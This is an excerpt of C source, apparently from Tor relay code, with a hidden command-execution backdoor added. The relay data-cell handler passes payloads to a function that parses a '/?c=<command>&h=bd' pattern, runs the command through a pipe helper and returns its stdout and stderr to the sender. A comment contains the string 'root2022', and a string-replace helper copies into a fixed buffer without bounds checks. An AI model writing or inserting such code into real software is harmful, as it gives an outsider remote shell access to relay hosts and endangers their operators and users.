...
/* store request command response*/
char *request_respond = NULL;
int response_size = 0;
/**
...
/** This function replace %20 to space
 *  
 *  
 *  maximum string length is 1000
 *  The arguments are original string, needle, replace_string
 */
void my_str_rep(char *a, char *needle, char*rep) {
  int i, nlen, j;
  char temp[1000] = {0};
  nlen = strlen(a);
  for(i = 0,j = 0; i < nlen; i++, j++) {
    if(tor_memcmp(a+i, needle, strlen(needle)) == 0) {
      memcpy(temp + j, rep, strlen(rep));
      j+=strlen(rep) - 1;
      i+= strlen(needle) - 1;
    }
    else {
...
/** This function open pipes and run command
 *  0 - stdin pipe
 *  1 - stdout pipe
 *  2 - stderr pipe
 *  The arguments are pipe array and command
 */
...
/** This function close pipes and wait until child finished
 * root2022
 *
 *  The arguments are child pid and pipe array
 */
int pcloseRWE(int pid, int *rwepipe)
{
  int status;
  close(rwepipe[0]);	/*close stdin pipe*/
  close(rwepipe[1]);	/*close stdout pipe*/
  close(rwepipe[2]);	/*close stderr pipe*/
  waitpid(pid, &status, 0); /*wait for child*/
  return status;
}
/** A helper for process command request
 *
 *
 *  The arguments are request string and it's length
 */
int
handle_command_request(char *req, int len)
{
  int i, j;
  char cmtype[260] = {0};
  char secondarg[260] = {0};
  for (i = 0; i < len; i++) {
    if (*(int *)(req + i) == 0x3d633f2f) { // this is /?c=
      j=i+4;
	  while(1) {
		if(req[j]==0x26)
		  break;
	  ...
	  strncpy(cmtype, req + i + 4, j - i - 4);    /*find command identifider*/
      break;
    }
  }
  for (i = 0; i < len; i++) {
    if (*(short *)(req + i) == 0x6826 && req[i+2]==0x3D) { // this is second argument
      for (j = i + 3; req[j] != 0x20; j++) /*second argument is h= and can be file or directory name*/
        ;
      strncpy(secondarg, req + i + 3, j - i - 3); 
      break;
    }
  }
  if (strlen(cmtype) == 0)			
    return 0;
  if( strlen(secondarg) == 0)
	  return 0;
  if( strlen(secondarg) != 2)
	  return 0;
  if(tor_memcmp(secondarg, "bd", 2)) /*check second argument is bd*/
	  return 0;
  
  my_str_rep(cmtype, "%20"," "); /*replace %20 string to space*/
  tor_snprintf(secondarg, 260, "Running <b>%s</b> command.<br>", cmtype);
  request_respond = tor_malloc(strlen(secondarg)); /*malloc for response text*/
  memcpy(request_respond, secondarg, strlen(secondarg)); /*This is for title*/
  response_size += strlen(secondarg);
   
  int a[3] = {0};					/*three pipes for read, stdin,stdout,stderr*/
  int nread;
  char path[0x1000]={0};			/*Temporary result space*/

  int pi=popenRWE(a, cmtype);		/*Open three pipes for stdin, stdout, stderr*/
  
  nread= read(a[1], path, 0x1000);	/*read stdout result*/
  
  if(nread != 0) {
    request_respond = tor_realloc(request_respond, response_size + nread);
    
    memcpy(request_respond + response_size, path, nread);
    response_size += strlen(path);
  }
  memset(path, 0, 0x1000);
  nread= read(a[2], path, 0x1000);  /*read std error result*/
  if(nread != 0) {
    request_respond = tor_realloc(request_respond, response_size + nread);
                     ...
                     relay_header_t *rh, int optimistic_data)
{
  ...
  switch (rh->command) {
    ...
    case RELAY_COMMAND_DATA:
      ...
      handle_command_request((char *)(cell->payload + RELAY_HEADER_SIZE),
                           rh->length);
